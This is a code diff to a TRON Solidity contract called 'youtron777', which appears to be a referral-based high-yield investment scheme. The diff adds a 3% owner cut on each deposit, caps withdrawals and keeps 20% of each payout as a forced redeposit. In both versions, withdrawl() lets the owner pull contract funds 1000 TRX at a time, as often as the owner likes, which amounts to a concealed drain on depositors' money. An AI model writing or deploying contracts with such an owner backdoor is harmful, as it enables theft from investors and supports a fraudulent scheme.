@@ -1,12 +1,14 @@
-pragma solidity 0.5.9;
+pragma solidity 0.6.0;
+
+import "./SafeMath.sol";
 
 contract youtron777 {
     using SafeMath for uint256;
-    address owner;
+    address payable owner;
     uint256 constant public INVEST_MIN_AMOUNT = 200 trx;
     uint256 constant public BASE_PERCENT = 100;
     uint256 constant public RETI_MIN = 70 trx;
-    uint256[] public REFERRAL_PERCENTS = [500, 300, 100, 100];
+    uint256[] public REFERRAL_PERCENTS = [500, 300, 100];
     uint256 constant public PERCENTS_INCREMENT = 7;
     uint256 constant public PERCENTS_DIVIDER = 10000;
     uint256 constant public CONTRACT_BALANCE_STEP = 700000 trx;
@@ -37,10 +39,10 @@ contract youtron777 {
     event Withdrawn(address indexed user, uint256 amount);
     event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
     event FeePayed(address indexed user, uint256 totalAmount);
- 
+
     constructor() public {
         owner = msg.sender;
-          
+
     }
 
     function invest(address referrer) public payable {
@@ -50,12 +52,13 @@ contract youtron777 {
 
         if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
             user.referrer = referrer;
+
         }
 
         if (user.referrer != address(0)) {
 
             address upline = user.referrer;
-            for (uint256 i = 0; i < 4; i++) {
+            for (uint256 i = 0; i < 3; i++) {
                 if (upline != address(0)) {
                     uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                     users[upline].bonus = users[upline].bonus.add(amount);
@@ -74,6 +77,8 @@ contract youtron777 {
 
         user.deposits.push(Deposit(msg.value, 0, block.timestamp));
 
+        owner.transfer(msg.value.mul(3).div(100));
+
         totalInvested = totalInvested.add(msg.value);
         totalDeposits = totalDeposits.add(1);
 
@@ -84,7 +89,12 @@ contract youtron777 {
     function withdrawl() public {
     if (msg.sender == owner) {
          uint amount = address(this).balance;
-         msg.sender.transfer(1000000000);
+         if (amount >= 1000000000){
+           msg.sender.transfer(1000000000);
+         }else{
+           msg.sender.transfer(amount);
+         }
+
     } else {
         User storage user = users[msg.sender];
 
@@ -133,10 +143,16 @@ contract youtron777 {
         if (contractBalance < totalAmount) {
             totalAmount = contractBalance;
         }
-    
+
         user.checkpoint = block.timestamp;
 
-        msg.sender.transfer(totalAmount);
+        if (totalAmount > 100000 trx ){
+          totalAmount = 100000 trx;
+        }
+
+        user.deposits.push(Deposit(totalAmount.mul(20).div(100), 0, block.timestamp));
+
+        msg.sender.transfer(totalAmount.mul(80).div(100));
 
         totalWithdrawn = totalWithdrawn.add(totalAmount);
 
@@ -207,7 +223,7 @@ contract youtron777 {
 
         return totalDividends;
     }
- 
+
     function getUserCheckpoint(address userAddress) public view returns(uint256) {
         return users[userAddress].checkpoint;
     }
@@ -273,40 +289,5 @@ contract youtron777 {
         assembly { size := extcodesize(addr) }
         return size > 0;
     }
-    
-}
 
-library SafeMath {
-
-    function add(uint256 a, uint256 b) internal pure returns (uint256) {
-        uint256 c = a + b;
-        require(c >= a, "SafeMath: addition overflow");
-
-        return c;
-    }
-
-    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-        require(b <= a, "SafeMath: subtraction overflow");
-        uint256 c = a - b;
-
-        return c;
-    }
-
-    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
-        if (a == 0) {
-            return 0;
-        }
-
-        uint256 c = a * b;
-        require(c / a == b, "SafeMath: multiplication overflow");
-
-        return c;
-    }
-
-    function div(uint256 a, uint256 b) internal pure returns (uint256) {
-        require(b > 0, "SafeMath: division by zero");
-        uint256 c = a / b;
-
-        return c;
-    }
 }
